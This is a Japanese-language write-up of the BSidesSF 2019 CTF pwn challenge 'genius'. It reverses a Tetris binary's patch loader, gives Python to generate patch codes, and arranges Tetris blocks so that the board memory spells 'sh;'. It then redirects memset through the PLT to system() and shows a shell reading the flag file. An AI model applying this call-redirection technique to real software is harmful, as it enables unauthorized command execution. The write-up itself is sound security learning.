# [pwn 500pts] genius - BSidesSF 2019 CTF
参加中は手を付けていない問題です。
32bitバイナリが2つ渡されます。
```
$ checksec genius 
[*] 'genius'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
$ checksec loader 
[*] 'loader'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
とりあえずIDAで解析します。
loaderの方をざっくり読むと、まずgeniusバイナリをロードしてコードを入力します。
コードが空ならそのままgeniusバイナリを動かしますが、コードが空でない場合はバイナリにパッチを当ててから動かします。
コードを元にoffsetとbyteを生成し、読み込んだバイナリの先頭からoffsetバイト目をbyteに上書きします。
一応範囲外の上書きを防ぐためにoffsetのチェックが入っており、geniusバイナリの中身しか書き換えられないようです。
パッチを当てる処理の中ではcodeを1バイトずつ別の関数に渡し、結果を`var_1`から`var_6`までに格納します。
したがって、与えるコードは6バイトであると思われます。
全体をCに翻訳すると次のようになります。
```c
int convert(char codebyte)
{
    switch(codebyte) {
        case 65: return 0;
        case 80: return 1;
        case 90: return 2;
        case 76: return 3;
        case 71: return 4;
        case 73: return 5;
        case 84: return 6;
        case 89: return 7;
        case 69: return 8;
        case 79: return 9;
        case 88: return 10;
        case 85: return 11;
        case 75: return 12;
        case 83: return 13;
        case 86: return 14;
        case 78: return 15;
        default: return -1;
    }
}

void apply_patch(char* code, int *offset, char *byte)
{
    char x1, x2, x3, x4, x5, x6;
    x1 = convert(code[0]);
    x2 = convert(code[1]);
    x3 = convert(code[2]);
    x4 = convert(code[3]);
    x5 = convert(code[4]);
    x6 = convert(code[5]);
    *offset = ((x2 & 0b1000) << 4) | ((x3 & 0b0111) << 4) | ((x4 & 0b0111) << 12) | (x4 & 0b1000) | ((x5 & 0b1000) << 8) | (x5 & 0b0111) | ((x6 & 0b0111) << 8);
    *byte = (x1 & 0b0111) | ((x1 & 0b1000) << 4) | ((x2 & 0b0111) << 4) | (x6 & 0b1000);
}
```
パッチは2回当てることができます。
うーん、いまいちピンと来ない。
とりあえず問題文は`/home/ctf/flag.txt`を読めと言っているので、geniusの方に使える何かが無いかを調べます。

geniusはテトリスが遊べるゲームなのですが、グローバル変数が多すぎて何に使われてるかよく分からないです。
とりあえず最初にゲームオブジェクトをmemsetで0x1Aバイト分0にしています。
このアドレスはsystem関数のアドレスと共に出力されます。
しかし別にPIEは無効だしsystem関数のアドレスはpltのが出力されてるし、特に欲しい情報ではありません。
その後スレッドを生成し、テトリスが実行されるようです。
ゲームオブジェクトはゲームオーバーするとmemsetで消去されるので、テトリスのスレッド内部のみで使われる変数のようです。
あと何かをインクリメントして直後にusleepするような場所があるのですが、たぶんインクリメントされているのは~~フレーム数かスコアでしょうか。~~
スコアはゲームオーバー時に出力されるグローバル変数ですので、フレーム数だと思います。

分からなくなってきたので気分転換にコード生成スクリプトを作ります。
試しに"In case it helps..."の"I"を"X"に変更するパッチを作りましょう。
次のようにパッチコードを生成しました。
```python
def patch(offset, byte):
    x = [-1 for i in range(6)]
    def conv_table():
        return [65, 80, 90, 76, 71, 73, 84, 89, 69, 79, 88, 85, 75, 83, 86, 78]

    def gen_code(x):
        return conv_table()[x]
        
    x[1] = (offset >> 4) & 0b1000
    x[2] = (offset >> 4) & 0b0111
    x[3] = (offset >> 12) & 0b0111
    x[3] |= offset & 0b1000
    x[4] = (offset >> 8) & 0b1000
    x[4] |= offset & 0b0111
    x[5] = (offset >> 8) & 0b0111
    x[0] = byte & 0b0111
    x[0] |= (byte >> 4) & 0b1000
    x[1] |= (byte >> 4) & 0b0111
    x[5] |= byte & 0b1000
    code = [gen_code(x[i]) for i in range(6)]
    return ''.join(list(map(chr, code)))

def apply_patch(code):
    x = [-1 for i in range(6)]
    def conv_table():
        return [65, 80, 90, 76, 71, 73, 84, 89, 69, 79, 88, 85, 75, 83, 86, 78]

    def convert(c):
        table = conv_table()
        if c in table:
            return table.index(c)
        else:
            return -1

    for i in range(6):
        x[i] = convert(ord(code[i]))
    offset = ((x[1] & 0b1000) << 4) | ((x[2] & 0b0111) << 4) | ((x[3] & 0b0111) << 12) | (x[3] & 0b1000) | ((x[4] & 0b1000) << 8) | (x[4] & 0b0111) | ((x[5] & 0b0111) << 8)
    byte = (x[0] & 0b0111) | ((x[0] & 0b1000) << 4) | ((x[1] & 0b0111) << 4) | (x[5] & 0b1000)
    return offset, byte

offset = 0x1624
char = ord("X")

code = patch(offset, char)
assert (offset, char) == apply_patch(code)
print(code)
```
生成されたコードを送ると上手くいきました。
```
Xn case it helps or whatever, system() is at 0x80485e0 and the game object is at 0x804b1a0. :)
Score: 0
```

2バイト変えられるので、適当な関数のGOTにsystem@PLTのアドレスを書き込めば何とかなりそうです。
しかし`/bin/sh`を引数として渡せそうな関数がないです。
GOTは下位1バイトだけを変更すればsystemに飛ばせるので後1バイトは別のことに使えます。
まず思い付いたのはmemsetをsystemに変更して、`game_object`をフレーム数のグローバル変数に変更する方法です。
でもフレーム数が`;sh`になるほど長期間プレイできないので却下。
思い付きそうにないのでwriteupを読みましょう。

memsetをsystemに変えるというのは合っているようです。
そこで、`game_object`はテトリスの画面のバッファなので、テトリスのブロックを上手いこと組み立てて、データ上`;sh`になる配置にしてゲームオーバーするそうです。
頭良い。

とりあえず次のような状態でゲームオーバーした直後の`game_object`の様子をgdbで見てみます。
```
Score: 10000

+----------+
|    *     |
|   ***    |
|    #     |
|   ##     |
|   #      |
|   ##     |
|   ##     |
|    #     |
|   ###    |
|    #     |
|   ##     |
|   ##     |
|   ##     |
|   #      |
|   ##     |
|   ###    |
|    ####  |
|   ###    |
|    #     |
| ## ##    |
| ##  #    |
+----------+
```
memsetで0x1aバイト初期化しているのは、0x1a * 8 = 208で、1ビットで1マスを表現していることが分かります。
```
gdb-peda$ x/26wb 0x804b1a0
0x804b1a0:      0x00    0x00    0x00    0x01    0x06    0x08    0x60    0x80
0x804b1a8:      0x01    0x04    0x38    0x40    0x80    0x01    0x06    0x18
0x804b1b0:      0x20    0x80    0x01    0x0e    0xf0    0xe0    0x00    0x81
0x804b1b8:      0x0d    0x26
```
例えば一番下の行の左端から8マスは0x26=0b00100110により表現されています。
~~一番下に`;sh`を作ってみましたが、テトリスでは再現できない状況です。~~
※作りたいのは`sh;`でした。
```
|    ## ###| 0000)(110111
|  ##  ### | 00)(11001110)
|   # ##   | (00010110)(00
+----------+
```

手書きで考えるのは大変なのでスクリプトを組んでテトリスで再現可能が考えてみましょう。
```python
ofs = 0x17
string = ";sh"

game_object = [0 for i in range(0x1a)]
for i in range(len(string)):
    game_object[ofs + i] = ord(string[i])

bits = ''.join(list(map(lambda x:bin(x)[2:].zfill(8)[::-1], game_object)))
bits += '00'

result = "+" + " " * 10 + "+\n"
for i in range(0, len(bits), 10):
    result += "|"
    for c in bits[i:i+10]:
        result += "." if c == '0' else '#'
    result += "|\n"
result += "+" + "-" * 10 + "+"

print(result)
```
また落ちてくるブロックの順番は固定で、「O, S, T, J, O, Z, Z, T, O, Z, ...」の順です。
例えば一番下に`sh;`を作ると
```
|....##..##|
|#....#.##.|
|##.###..##|
+----------+
```
となり、Lが必要なので面倒です。
こんな感じで上げていくと、次の配置はいけそうな気がします。（`*`は自由）
```
|........##|
|..###....#|
|.##.##.###|
|..********|
|**********|
+----------+
```

まずO, S, T, Jを次のように配置します。
```
|.........J|
|..T......J|
|.TT.....JJ|
|..TSS...OO|
|..SS....OO|
+----------+
```

次にO, Zを次のように積みます。
```
|.........Z|
|.OO.....ZZ|
|.OO.....Z#|
|..#......#|
|.##.....##|
|..###...##|
|..##....##|
+----------+
```

さらにZ, Tを次のように積みます。
```
|.........#|
|.##.....##|
|.##.....##|
|..#ZZ....#|
|.##.ZZ.T##|
|..###.TT##|
|..##...T##|
+----------+
```
これでメモリ上に`sh;`ができます。
あとは左の方にでも適当に積んでいってゲームオーバーに持ち込めばOKです。
さて、この場合`game_object`からオフセット0x15に`sh;`ができるので、ゲームオーバー時のmemsetの引数の下位1バイト0xa0を0xb5に変更します。
IDAでは0x0804954cに0xa0があるので0x154cを0xb5にすれば良さそうです。
また、最初に言ったようにmemsetのGOTをsystemに変更する必要があります。
というかmemsetのPLTでジャンプ先をsystemにすれば良いのか。
IDAでは0x8048622に0x30があるので、0x0622を0x20にすれば良さそうです。
ということで、コードは次の2つになります。
```
SLGOGI
AZZAZT
```
あとはテトリスのブロックの動きを頭に入れてから挑戦しましょう。

できました！
```
Score: 14000

+----------+
|          |
|  #  *    |
|  ##**    |
|   #      |
|   #      |
|####      |
|###       |
| #        |
|##        |
| #        |
| #        |
|##        |
|#         |
|##        |
|##       #|
| ##     ##|
| ##     ##|
|  ###    #|
| ## ## ###|
|  ### ####|
|  ##   ###|
+----------+
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat /home/ctf/flag.txt
Flag: CTF{game_genie_killed_the_nintendo_star}
```

# 感想
発想が素晴らしいと思いますし、やってて楽しかったです。

# 参考文献
[1] [https://github.com/VoidHack/write-ups/tree/master/BSidesSF%202019%20CTF/pwn/genius](https://github.com/VoidHack/write-ups/tree/master/BSidesSF%202019%20CTF/pwn/genius)